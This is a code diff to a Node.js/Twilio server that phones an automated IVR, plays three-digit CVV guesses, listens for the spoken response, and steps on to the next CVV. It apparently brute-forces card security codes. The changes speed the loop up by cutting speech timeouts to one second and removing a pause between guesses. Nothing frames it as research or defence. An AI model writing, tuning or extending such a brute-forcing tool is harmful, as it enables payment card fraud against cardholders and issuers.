@@ -42,7 +42,7 @@ export const getTwiML = async (req, res) => {
             action: `${host}/api/call/listen/${attemptId}?currentCvv=${cvv}`,
             method: 'POST',
             timeout: 5, // How long to listen for IVR to speak
-            speechTimeout: 'auto'
+            speechTimeout: 1
         });
         
     } else {
@@ -81,11 +81,12 @@ export const handleInteractiveListen = async (req, res) => {
        await AttemptModel.addLog(attemptId, `Listen loop: No speech detected from IVR.`);
        // Retry listen
        const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
-       twiml.gather({
+        twiml.gather({
             input: 'speech',
             action: `${host}/api/call/listen/${attemptId}?currentCvv=${currentCvv}`,
             method: 'POST',
-            timeout: 5
+            timeout: 5,
+            speechTimeout: 1
        });
        res.type('text/xml');
        return res.send(twiml.toString());
@@ -128,8 +129,7 @@ export const handleInteractiveListen = async (req, res) => {
             const nextCvv = nextCvvNum.toString().padStart(3, '0');
             await AttemptModel.addLog(attemptId, `Trying next CVV: ${nextCvv}`);
             
-            // Send the next CVV with a slight pause so the IVR is ready to listen
-            twiml.pause({ length: 1 });
+            // Send the next CVV
             twiml.play({ digits: nextCvv });
             
             // Immediately start listening for the response to this new CVV
@@ -138,7 +138,8 @@ export const handleInteractiveListen = async (req, res) => {
                 input: 'speech',
                 action: `${host}/api/call/listen/${attemptId}?currentCvv=${nextCvv}`,
                 method: 'POST',
-                timeout: 5
+                timeout: 5,
+                speechTimeout: 1
             });
             
             // Update the DB so the frontend shows the current CVV
@@ -155,7 +156,8 @@ export const handleInteractiveListen = async (req, res) => {
             input: 'speech',
             action: `${host}/api/call/listen/${attemptId}?currentCvv=${currentCvv}`,
             method: 'POST',
-            timeout: 5
+            timeout: 5,
+            speechTimeout: 1
         });
     }
 
